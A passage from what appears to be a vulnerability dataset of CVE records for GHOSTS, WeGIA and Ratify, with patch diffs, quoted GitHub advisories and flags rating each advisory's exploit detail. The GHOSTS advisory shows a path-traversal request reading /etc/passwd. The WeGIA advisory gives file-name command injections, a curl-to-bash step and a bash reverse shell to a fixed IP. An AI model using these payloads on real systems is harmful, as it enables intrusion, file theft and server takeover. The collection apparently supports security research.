System.IO;\n+\n+namespace ghosts.api.Infrastructure.Extensions;\n+\n+public static class DirectoryExtensions\n+{\n+    public static bool IsPathWithinAppScope(this string targetPath, string root)\n+    {\n+        try\n+        {\n+            var fullRootPath = Path.GetFullPath(root).TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar;\n+            var fullTargetPath = Path.GetFullPath(Path.Combine(fullRootPath, targetPath));\n+\n+            return fullTargetPath.StartsWith(fullRootPath, StringComparison.OrdinalIgnoreCase);\n+        }\n+        catch\n+        {\n+            return false;\n+        }\n+    }\n+}\n```",
                "url": "https://github.com/cmu-sei/GHOSTS/commit/e69827556a52ff813de00e1017c4b62598d2c887"
            }
        ],
        "published_date": "2025-02-19T22:16:56.207Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ncmu-sei\n/\nGHOSTS\nPublic\nNotifications You must be signed in to change notification settings\nFork 75\nStar 565\nCode\nIssues\n13\nPull requests\nDiscussions\nActions\nSecurity\n1\nInsights\nAdditional navigation options\n[XBOW-025-109] Path Traversal Vulnerability in GHOSTS API 8.x Photo Retrieval Endpoint\nCritical sei-dupdyke published GHSA-qr67-m6w9-wj3j on Feb 19Feb 19, 2025\nPackage\nGHOSTS API\nAffected versions\nGHOSTS API v 8.0.0 through 8.2.7.90\nPatched versions\n8.2.7.90\nDescription\nDisclaimer\nThis vulnerability was detected using XBOW, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports.\nDescription\nA path traversal vulnerability was discovered in GHOSTS version 8.0.0.0 that allows an attacker to access files outside of the intended directory through the photo retrieval endpoint. The vulnerability exists in the /api/npcs/{id}/photo endpoint, which is designed to serve profile photos for NPCs (Non-Player Characters) but fails to properly validate and sanitize file paths.\nWhen an NPC is created with a specially crafted photoLink value containing path traversal sequences (../, .., etc.), the application processes these sequences without proper sanitization. This allows an attacker to traverse directory structures and access files outside of the intended photo directory, potentially exposing sensitive system files.\nThe vulnerability is particularly severe because it allows reading arbitrary files from the server's filesystem with the permissions of the web application process, which could include configuration files, credentials, or other sensitive data.\nSteps to Reproduce\nCreate a new NPC by sending a POST request to /api/npcs with a valid GUID and including path traversal in the photoLink:\nPOST /api/npcs HTTP/1.1\nHost: ghosts:5000\nContent-Type: application/json\n\n{\n  \"id\": \"<valid-guid>\",\n  \"name\": {\"firstName\": \"test\", \"lastName\": \"test\"},\n  \"photoLink\": \"..//../..//../..//etc/passwd\"\n}\nAccess the photo endpoint for the created NPC:\nGET /api/npcs/<npc-id>/photo HTTP/1.1\nHost: ghosts:5000\nAfter following these steps, the server responds with the contents of the target file instead of a legitimate photo, demonstrating successful path traversal. The application returns the file content with a Content-Type of image/jpg, regardless of the actual file type.\nMitigations available in GHOSTS API v8.2.7.90 and later\nPath validation and sanitization that removes or blocks path traversal sequences (../, .., etc.) before processing file paths.\nMust call a valid image directory and must be a valid image extension (jpeg, jpg, png).\nImpact\nThis vulnerability allows authenticated users to read arbitrary files from the server's filesystem that are accessible to the application's service account. The impact is high as it could lead to exposure of sensitive information such as configuration files, credentials, or other confidential data stored on the server.\nSeverity\nCritical\nCVE ID\nCVE-2025-27092\nWeaknesses\nNo CWEs\nCredits\nxbow-security\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains specific steps to reproduce the vulnerability, demonstrating how to exploit the issue.",
                "url": "https://github.com/cmu-sei/GHOSTS/security/advisories/GHSA-qr67-m6w9-wj3j"
            }
        ],
        "sw_version": "v8.0.0",
        "sw_version_wget": "https://github.com/cmu-sei/GHOSTS/archive/refs/tags/v8.0.0.zip"
    },
    "CVE-2025-27140": {
        "cwe": [
            {
                "id": "CWE-78",
                "value": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
            },
            {
                "id": "CWE-284",
                "value": "CWE-284: Improper Access Control"
            }
        ],
        "description": "WeGIA is a Web manager for charitable institutions. An OS Command Injection vulnerability was discovered in versions prior to 3.2.15 of the WeGIA application, `importar_dump.php` endpoint. This vulnerability could allow an attacker to execute arbitrary code remotely. The command is basically a command to move a temporary file, so a webshell upload is also possible. Version 3.2.15 contains a patch for the issue.",
        "languages": [
            "PHP"
        ],
        "patch_commits": [
            {
                "content": "Adicionada verifica\u00e7\u00e3o do tipo de arquivo utilizado na importa\u00e7\u00e3o [Security https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-xw6w-x28r-2p5c]\n\nFilename: html/configuracao/importar_dump.php:\n```\n@@ -1,7 +1,7 @@\n<?php\n \n session_start();\n-if (!isset($_SESSION[\"usuario\"])){\n+if (!isset($_SESSION[\"usuario\"])) {\n     header(\"Location: ../../index.php\");\n     exit();\n }\n\n@@ -15,11 +15,25 @@\ndefine(\"REDIRECT\", $_REQUEST[\"redirect\"] ?? \"./configuracao_geral.php\");\n \n $newFileName = $_FILES[\"import\"][\"name\"];\n+$fileTmpPath = $_FILES[\"import\"][\"tmp_name\"];\n+$fileExtension = pathinfo($newFileName, PATHINFO_EXTENSION);\n+$allowedMimeTypes = ['application/x-gzip', 'application/gzip', 'application/x-tar'];\n \n-$log = shell_exec((\"mv \". escapeshellarg($_FILES[\"import\"][\"tmp_name\"]) . \" \" . BKP_DIR . escapeshellarg($_FILES[\"import\"][\"name\"])));\n-if ($log){\n-    header(\"Location: ./configuracao_geral.php?msg=error&err=Houve um erro na importa\u00e7\u00e3o!&log=\".base64_encode($log));\n+// Verifica se a extens\u00e3o \u00e9 \"dump.tar.gz\"\n+if (!preg_match('/^gz$/i', $fileExtension) && !preg_match('/dump\\.tar\\.gz$/i', $newFileName)) {\n+    header(\"Location: ./configuracao_geral.php?msg=error&err=Apenas arquivos dump.tar.gz s\u00e3o permitidos.\");\n+    exit();\n }\n-header(\"Location: ./configuracao_geral.php?msg=success&sccs=Importa\u00e7\u00e3o realizada com sucesso!\");\n \n+// Verifica o MIME type do arquivo\n+$fileMimeType = mime_content_type($fileTmpPath);\n+if (!in_array($fileMimeType, $allowedMimeTypes)) {\n+    header(\"Location: ./configuracao_geral.php?msg=error&err=O tipo de arquivo n\u00e3o \u00e9 v\u00e1lido para um arquivo DUMP.TAR.GZ.\");\n+    exit();\n+}\n \n+$log = shell_exec((\"mv \" . escapeshellarg($_FILES[\"import\"][\"tmp_name\"]) . \" \" . BKP_DIR . escapeshellarg($_FILES[\"import\"][\"name\"])));\n+if ($log) {\n+    header(\"Location: ./configuracao_geral.php?msg=error&err=Houve um erro na importa\u00e7\u00e3o!&log=\" . base64_encode($log));\n+}\n+header(\"Location: ./configuracao_geral.php?msg=success&sccs=Importa\u00e7\u00e3o realizada com sucesso!\");\n```",
                "url": "https://github.com/LabRedesCefetRJ/WeGIA/commit/7d0df8c9a0b8b7d6862bbc23dc729d73e39672a1"
            }
        ],
        "published_date": "2025-02-24T21:21:24.013Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nLabRedesCefetRJ\n/\nWeGIA\nPublic\nNotifications You must be signed in to change notification settings\nFork 6\nStar 9\nCode\nIssues\n322\nPull requests\n2\nActions\nSecurity\n67\nInsights\nAdditional navigation options\nOS Command Injection endpoint 'importar_dump.php' parameter 'import' (RCE)\nCritical nilsonLazarin published GHSA-xw6w-x28r-2p5c on Feb 24Feb 24, 2025\nPackage\ncomposer WeGIA\n(\nComposer\n)\nAffected versions\n<=3.2.14\nPatched versions\n3.2.15\nDescription\nSummary\nAn OS Command Injection vulnerability was discovered in the WeGIA application, importar_dump.php endpoint. This vulnerability could allow an attacker to execute arbitrary code remotely. The command is basically a command to move a temporary file, so a webshell upload is also possible.\nDetails\nVulnerable Endpoint: POST /html/configuracao/importar_dump.php\nParameter: import\nThe vulnerability occurs in the code below in the import_dump.php endpoint.\n$log = shell_exec(\"mv \". $_FILES[\"import\"][\"tmp_name\"] . \" \" . BKP_DIR . $_FILES[\"import\"][\"name\"]);\nSince there is no validation of user input, arbitrary code execution is possible.\nAlso, although the Redirect code exists after session validation, there is no proper execution termination process, so the code is executed afterward. This allows arbitrary file uploads and code execution even if you are not logged in.\n<?php\nif (!isset($_SESSION[\"usuario\"])){\n    header(\"Location: ../../index.php\");\n}\n(\u203b True, the preceding <pre> tag output causes the php to flush all collected headers, which prevents the redirect process from occurring normally (PHP version: 7.3.30). However, it is still possible for an unauthorized person to execute arbitrary code even if the normal logic proceeds except for the <pre> tag output.)\nheader-already-sent-error-in-php\nPoC\nExecuting SLEEP\nBy uploading file name: a;sleep 5, you can confirm code executed.\nExecute reverse shell\nWriting a reverse shell connection proof-of-concept is tricky because the '/' sign is part of the file path, but if you build a page that responds appropriately (e.g. bash -i >& /dev/tcp/172.30.137.198/7777 0>&1) and pass it to the bash shell with a '|' sign, you can reverse shell.\nfile name: a;curl -L <your_page_responses_rev_shell_code> | bash\nWeb shell upload\nHowever, file upload functionality is implemented in the original feature, so webshell uploads are easily possible.\nfile name:l8BL.php\nfile path: /html/configuracao/l8BL.php\nImpact\nInformation disclosure: An attacker can obtain information from the system directly and use it in a secondary attack.\nWeb Server Takeover: If an attacker gains \u201croot\u201d privileges through an elevation of privilege attack, they can take over a web server and install malware.\nCryptomining: Run cryptomining or cryptojacking malware that uses the computing resources of an infected device to mine cryptocurrencies, for the financial benefit of the attacker.\nSeverity\nCritical\n10.0\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nSubsequent System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H\nCVE ID\nCVE-2025-27140\nWeaknesses\nCWE-78 CWE-284\nCredits\nl8BL\nReporter\nchan-woong\nReporter\nGabrielPintoSouza\nRemediation developer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept for exploiting the vulnerability.",
                "url": "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-xw6w-x28r-2p5c"
            }
        ],
        "sw_version": "v3.2.14",
        "sw_version_wget": "https://github.com/LabRedesCefetRJ/WeGIA/archive/refs/tags/v3.2.14.zip"
    },
    "CVE-2025-27403": {
        "cwe": [
            {
                "id": "CWE-287",
                "value": "CWE-287: Improper Authentication"
            }
        ],
        "description": "Ratify is a verification engine as a binary executable and on Kubernetes which enables verification of artifact security metadata and admits for deployment only those that comply with policies the user creates. In a Kubernetes environment, Ratify can be configured to authenticate to a private Azure Container Registry (ACR). The Azure workload identity and Azure managed identity authentication providers are configured in this setup. Users that configure a private ACR to be used with the Azure authentication providers may be impacted by a vulnerability that exists in versions prior to 1.2.3 and 1.3.2. Both Azure authentication providers attempt to exchange an Entra ID (EID) token for an ACR refresh token. However, Ratify\u2019s Azure authentication providers did not verify that the target registry is an ACR. This could have led to the EID token being presented to a non-ACR registry during token exchange. EID tokens with ACR access can potentially be extracted and abused if a user workload contains an image reference to a malicious registry. As of versions 1.2.3 and 1.3.2, the Azure workload identity and Azure managed identity authentication providers are updated to add new validation prior to EID token exchange. Validation relies upon registry domain validation against a pre-configured list of well-known ACR endpoints. EID token exchange will be executed only if at least one of the configured well-known domain suffixes (wildcard support included) matches the registry domain of the image reference.",
        "languages": [
            "Go"
        ],
        "patch_commits": [
            {
                "content": "fix: enforce host checking before exchanging a refresh token (#2069) (#2072)\n\nSigned-off-by: Binbin Li <libinbin@microsoft.com>\nSigned-off-by: Akash Singhal <akashsinghal@microsoft.com>\nSigned-off-by: Shahram Kalantari <shahramk@gmail.com>\nSigned-off-by: dependabot[bot] <support@github.com>\nCo-authored-by: Akash Singhal <akashsinghal@microsoft.com>\nCo-authored-by: Shahram Kalantari <shahramk@gmail.com>\nCo-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>\n\nFilename: .devcontainer/Dockerfile:\n```\n@@ -13,8 +13,8 @@\n# See here for image contents: https://github.com/microsoft/vscode-dev-containers/tree/v0.245.2/containers/go/.devcontainer/base.Dockerfile\n \n-# [Choice] Go version (use -bullseye variants on local arm64/Apple Silicon): 1.21-bullseye, 1, 1.19, 1.18, 1-bullseye, 1.19-bullseye, 1.18-bullseye, 1-buster, 1.19-buster, 1.18-buster\n-FROM mcr.microsoft.com/vscode/devcontainers/go:1.21-bullseye@sha256:0ea3913135923a684b37f9e75a1e9adbb14551199244656b77f516c4c0c6d5bc\n+# [Choice] Go version (use -bullseye variants on local arm64/Apple Silicon): 1.22-bullseye, 1.21-bullseye, 1, 1.19, 1.18, 1-bullseye, 1.19-bullseye, 1.18-bullseye, 1-buster, 1.19-buster, 1.18-buster\n+FROM mcr.microsoft.com/vscode/devcontainers/go:1.22-bullseye@sha256:a80cd1df0fed16f2a6f6854b87df49940100449aa193fb55dc30acfdc7fd7309\n \n # [Choice] Node.js version: none, lts/*, 18, 16, 14\n ARG NODE_VERSION=\"none\"\n```\n\nFilename: .devcontainer/devcontainer.json:\n```\n@@ -5,10 +5,10 @@\n\"build\": {\n \t\t\"dockerfile\": \"Dockerfile\",\n \t\t\"args\": {\n-\t\t\t// Update the VARIANT arg to pick a version of Go: 1.21, 1.20, 1.19, 1.18\n+\t\t\t// Update the VARIANT arg to pick a version of Go: 1.22, 1.21, 1.20, 1.19, 1.18\n \t\t\t// Append -bullseye or -buster to pin to an OS version.\n \t\t\t// Use -bullseye variants on local arm64/Apple Silicon.\n-\t\t\t\"VARIANT\": \"1.21-bullseye\",\n+\t\t\t\"VARIANT\": \"1.22-bullseye\",\n \t\t\t// Options\n \t\t\t\"NODE_VERSION\": \"none\",\n \t\t\t// Ratify-specific devcontainer options\n```\n\nFilename: .github/crd.trivyignore.yaml:\n```\n@@ -0,0 +1,3 @@\n+vulnerabilities:\n+  - id: CVE-2024-45338\n+    statement: kubectl is not vulnerable to this and is reason for being flagged\n\\ No newline at end of file\n```\n\nFilename: .github/dependabot.yml:\n```\n@@ -33,7 +33,7 @@\nupdates:\n       interval: \"weekly\"\n     ignore:\n       - dependency-name: \"golang\"\n-        versions: '> 1.21'\n+        versions: '> 1.23'\n     commit-message:\n       prefix: \"chore\"\n\n@@ -43,6 +43,6 @@\nupdates:\n       interval: \"weekly\"\n     ignore:\n       - dependency-name: \"vscode/devcontainers/go\"\n-        versions: '> 1.21'\n+        versions: '> 1.23'\n     commit-message:\n       prefix: \"chore\"\n```\n\nFilename: .github/workflows/build-pr.yml:\n```\n@@ -22,9 +22,9 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.29.2\"]\n-        GATEKEEPER_VERSION: [\"3.15.0\"]\n-    uses: ./.github/workflows/e2e-k8s.yml \n+        KUBERNETES_VERSION: [\"1.31.2\"]\n+        GATEKEEPER_VERSION: [\"3.18.0\"]\n+    uses: ./.github/workflows/e2e-k8s.yml\n     with:\n       k8s_version: ${{ matrix.KUBERNETES_VERSION }}\n       gatekeeper_version: ${{ matrix.GATEKEEPER_VERSION }}\n\n@@ -35,9 +35,9 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.7\", \"1.29.2\"]\n-        GATEKEEPER_VERSION: [\"3.13.0\", \"3.14.0\", \"3.15.0\"]\n-    uses: ./.github/workflows/e2e-k8s.yml \n+        KUBERNETES_VERSION: [\"1.30.6\", \"1.31.2\"]\n+        GATEKEEPER_VERSION: [\"3.16.0\", \"3.17.0\", \"3.18.0\"]\n+    uses: ./.github/workflows/e2e-k8s.yml\n     with:\n       k8s_version: ${{ matrix.KUBERNETES_VERSION }}\n       gatekeeper_version: ${{ matrix.GATEKEEPER_VERSION }}\n\n@@ -51,8 +51,8 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.27.9\", \"1.29.2\"]\n-        GATEKEEPER_VERSION: [\"3.13.0\", \"3.14.0\", \"3.15.0\"]\n+        KUBERNETES_VERSION: [\"1.30.6\", \"1.31.2\"] \n+        GATEKEEPER_VERSION: [\"3.16.0\", \"3.17.0\", \"3.18.0\"]\n     uses: ./.github/workflows/e2e-aks.yml\n     with:\n       k8s_version: ${{ matrix.KUBERNETES_VERSION }}\n\n@@ -72,11 +72,11 @@\njobs:\n     environment: azure-test\n     steps:\n       - name: Check out code into the Go module directory\n-        uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n-      - name: Set up Go 1.21\n+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n+      - name: Set up Go 1.22\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n+          go-version: '1.22'\n \n       - name: Az CLI login\n         uses: azure/login@6b2456866fc08b011acb422a92a4aa20e2c4de32 # v2.1.0\n```\n\nFilename: .github/workflows/codeql.yml:\n```\n@@ -31,7 +31,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: \"1.21\"\n+          go-version: \"1.23\"\n       - name: Initialize CodeQL\n         uses: github/codeql-action/init@cdcdbb579706841c47f7063dda365e292e5cad7a # tag=v2.13.4\n         with:\n```\n\nFilename: .github/workflows/e2e-aks.yml:\n```\n@@ -9,7 +9,7 @@\non:\n       k8s_version:\n         description: 'Kubernetes version'\n         required: true\n-        default: '1.29.2'\n+        default: \"1.31.2\"\n         type: string\n       gatekeeper_version:\n         description: 'Gatekeeper version'\n\n@@ -33,11 +33,11 @@\njobs:\n       contents: read\n     steps:\n       - name: Check out code into the Go module directory\n-        uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n-      - name: Set up Go 1.21\n+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n+          go-version: '1.23'\n       - name: Az CLI login\n         uses: azure/login@6b2456866fc08b011acb422a92a4aa20e2c4de32 # v2.1.0\n         with:\n```\n\nFilename: .github/workflows/e2e-cli.yml:\n```\n@@ -31,7 +31,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: \"1.21\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Build CLI\n\n@@ -55,7 +55,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: \"1.21\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Build CLI\n```\n\nFilename: .github/workflows/e2e-k8s.yml:\n```\n@@ -9,7 +9,7 @@\non:\n       k8s_version:\n         description: 'Kubernetes version'\n         required: true\n-        default: '1.29.2'\n+        default: \"1.31.2\"\n         type: string\n       gatekeeper_version:\n         description: 'Gatekeeper version'\n\n@@ -26,11 +26,11 @@\njobs:\n       contents: read\n     steps:\n       - name: Check out code into the Go module directory\n-        uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n-      - name: Set up Go 1.21\n+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n+          go-version: '1.23'\n \n       - name: Bootstrap e2e\n         run: |\n```\n\nFilename: .github/workflows/golangci-lint.yml:\n```\n@@ -16,9 +16,10 @@\njobs:\n     steps:\n       - uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n-      - uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n+          go-version: '1.23'\n+      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n       - name: golangci-lint\n-        uses: golangci/golangci-lint-action@a4f60bb28d35aeee14e6880718e0c85ff1882e64 # v6.0.1\n+        uses: golangci/golangci-lint-action@ec5d18412c0aeab7936cb16880d708ba2a64e1ae # v6.2.0\n         with:\n-          version: v1.55.2\n+          version: v1.62.2\n+          args: --timeout=20m\n```\n\nFilename: .github/workflows/high-availability.yml:\n```\n@@ -30,11 +30,11 @@\njobs:\n         DAPR_VERSION: [\"1.13.2\"]\n     steps:\n       - name: Check out code into the Go module directory\n-        uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n-      - name: Set up Go 1.21\n+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n+          go-version: '1.23'\n \n       - name: Bootstrap e2e\n         run: |\n```\n\nFilename: .github/workflows/publish-dev-assets.yml:\n```\n@@ -45,7 +45,16 @@\njobs:\n       - name: docker build ratify-crds\n         run: |\n           docker buildx create --use\n-          docker buildx build --build-arg KUBE_VERSION=\"1.29.2\" -f crd.Dockerfile --platform linux/amd64,linux/arm64,linux/arm/v7 --label org.opencontainers.image.revision=${{ github.sha }} -t ${{ steps.prepare.outputs.crdref }}:${{ steps.prepare.outputs.version }} -t ${{ steps.prepare.outputs.crdref }} --push ./charts/ratify/crds\n+          docker buildx build \\\n+            --attest type=sbom \\\n+            --attest type=provenance,mode=max \\\n+            --build-arg KUBE_VERSION=\"1.30.6\" \\\n+            -f crd.Dockerfile \\\n+            --platform linux/amd64,linux/arm64,linux/arm/v7 \\\n+            --label org.opencontainers.image.revision=${{ github.sha }} \\\n+            -t ${{ steps.prepare.outputs.crdref }}:${{ steps.prepare.outputs.version }} \\\n+            -t ${{ steps.prepare.outputs.crdref }} \\\n+            --push ./charts/ratify/crds\n       - name: docker build ratify base\n         run: |\n           docker buildx create --use\n```\n\nFilename: .github/workflows/publish-package.yml:\n```\n@@ -44,7 +44,15 @@\njobs:\n       - name: docker build ratify-crds\n         run: |\n           docker buildx create --use\n-          docker buildx build --build-arg KUBE_VERSION=\"1.29.2\" -f crd.Dockerfile --platform linux/amd64,linux/arm64,linux/arm/v7 --label org.opencontainers.image.revision=${{ github.sha }} -t ${{ steps.prepare.outputs.crdref }} --push ./charts/ratify/crds\n+          docker buildx build \\\n+            --attest type=sbom \\\n+            --attest type=provenance,mode=max \\\n+            --build-arg KUBE_VERSION=\"1.30.6\" \\\n+            -f crd.Dockerfile \\\n+            --platform linux/amd64,linux/arm64,linux/arm/v7 \\\n+            --label org.opencontainers.image.revision=${{ github.sha }} \\\n+            -t ${{ steps.prepare.outputs.crdref }} \\\n+            --push ./charts/ratify/crds\n       - name: docker build ratify base\n         run: |\n           docker buildx create --use\n```\n\nFilename: .github/workflows/quick-start.yml:\n```\n@@ -27,14 +27,14 @@\njobs:\n       contents: read\n     strategy:\n       matrix:\n-        KUBERNETES_VERSION: [\"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.30.6\"]\n     steps:\n       - name: Checkout\n         uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n       - name: setup go environment\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: \"1.21\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Bootstrap e2e\n```\n\nFilename: .github/workflows/release.yml:\n```\n@@ -23,7 +23,7 @@\njobs:\n     - name: Set up Go\n       uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n       with:\n-        go-version: '1.21'\n+        go-version: '1.23'\n \n     - name: Goreleaser\n       uses: goreleaser/goreleaser-action@5742e2a039330cbb23ebf35f046f814d4c6ff811 # v5.1.0\n```\n\nFilename: .github/workflows/run-full-validation.yml:\n```\n@@ -24,9 +24,9 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.7\", \"1.29.2\"]\n-        GATEKEEPER_VERSION: [\"3.13.0\", \"3.14.0\", \"3.15.0\"]\n-    uses: ./.github/workflows/e2e-k8s.yml \n+        KUBERNETES_VERSION: [\"1.30.6\", \"1.31.2\"]\n+        GATEKEEPER_VERSION: [\"3.16.0\", \"3.17.0\", \"3.18.0\"]\n+    uses: ./.github/workflows/e2e-k8s.yml\n     with:\n       k8s_version: ${{ matrix.KUBERNETES_VERSION }}\n       gatekeeper_version: ${{ matrix.GATEKEEPER_VERSION }}\n\n@@ -39,8 +39,8 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.27.9\", \"1.29.2\"]\n-        GATEKEEPER_VERSION: [\"3.13.0\", \"3.14.0\", \"3.15.0\"]\n+        KUBERNETES_VERSION: [\"1.30.6\", \"1.31.2\"]\n+        GATEKEEPER_VERSION: [\"3.16.0\", \"3.17.0\", \"3.18.0\"]\n     uses: ./.github/workflows/e2e-aks.yml\n     with:\n       k8s_version: ${{ matrix.KUBERNETES_VERSION }}\n\n@@ -60,11 +60,11 @@\njobs:\n     environment: azure-test\n     steps:\n       - name: Check out code into the Go module directory\n-        uses: actions/checkout@44c2b7a8a4ea60a981eaca3cf939b5f4305c123b # v4.1.5\n-      - name: Set up Go 1.21\n+        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: '1.21'\n+          go-version: '1.23'\n \n       - name: Az CLI login\n         uses: azure/login@6b2456866fc08b011acb422a92a4aa20e2c4de32 # v2.1.0\n```\n\nFilename: .github/workflows/scan-vulns.yaml:\n```\n@@ -27,14 +27,16 @@\njobs:\n \n       - uses: actions/setup-go@cdcb36043654635271a94b9a6d1392de5bb323a7 # v5.0.1\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n           check-latest: true\n       - uses: golang/govulncheck-action@dd0578b371c987f96d1185abb54344b44352bd58 # v1.0.3\n \n   scan_vulnerabilities:\n     name: \"[Trivy] Scan for vulnerabilities\"\n     runs-on: ubuntu-22.04\n     timeout-minutes: 15\n+    env:\n+      TRIVY_VERSION: 0.58.2\n     steps:\n       - name: Harden Runner\n         uses: step-security/harden-runner@17d0e2bd7d51742c71671bd19fa12bdc9d40a3d6 # v2.8.1\n\n@@ -50,8 +52,6 @@\njobs:\n           wget https://github.com/aquasecurity/trivy/releases/download/v${{ env.TRIVY_VERSION }}/trivy_${{ env.TRIVY_VERSION }}_Linux-64bit.tar.gz\n           tar zxvf trivy_${{ env.TRIVY_VERSION }}_Linux-64bit.tar.gz\n           echo \"$(pwd)\" >> $GITHUB_PATH\n-        env:\n-          TRIVY_VERSION: \"0.46.0\"\n \n       - name: Run trivy on git repository\n         run: |\n\n@@ -66,8 +66,7 @@\njobs:\n           for img in \"localbuild:test\" \"localbuildcrd:test\"; do\n               trivy image --ignore-unfixed --vuln-type=\"os,library\" \"${img}\"\n           done\n-      - name: Run trivy on images and exit on HIGH severity\n+      - name: Run trivy on images and exit on HIGH/CRITICAL severity\n         run: |\n-          for img in \"localbuild:test\" \"localbuildcrd:test\"; do\n-              trivy image --ignore-unfixed --exit-code 1 --severity HIGH --vuln-type=\"os,library\" \"${img}\"\n-          done\n\\ No newline at end of file\n+          trivy image --skip-db-update --ignore-unfixed --exit-code 1 --severity HIGH,CRITICAL --vuln-type=\"os,library\" \"localbuild:test\"\n+          trivy image --skip-db-update --ignore-unfixed --exit-code 1 --severity HIGH,CRITICAL --vuln-type=\"os,library\" --show-suppressed --ignorefile ./.github/crd.trivyignore.yaml \"localbuildcrd:test\"\n```\n\nFilename: .golangci.yml:\n```\n@@ -1,6 +1,3 @@\n-run:\n-  deadline: 5m\n-\n linters:\n   disable-all: true\n   enable:\n```\n\nFilename: CONTRIBUTING.md:\n```\n@@ -161,8 +161,8 @@\nFollow the steps below to build and deploy a Ratify image with your private chan\n export REGISTRY=yourregistry\n docker buildx create --use\n \n-docker buildx build -f httpserver/Dockerfile --platform linux/amd64 --build-arg build_sbom=true --build-arg build_licensechecker=true --build-arg build_schemavalidator=true --build-arg build_vulnerabilityreport=true -t ${REGISTRY}/deislabs/ratify:yourtag .\n-docker build --progress=plain --build-arg KUBE_VERSION=\"1.29.2\" --build-arg TARGETOS=\"linux\" --build-arg TARGETARCH=\"amd64\" -f crd.Dockerfile -t ${REGISTRY}/localbuildcrd:yourtag ./charts/ratify/crds\n+docker 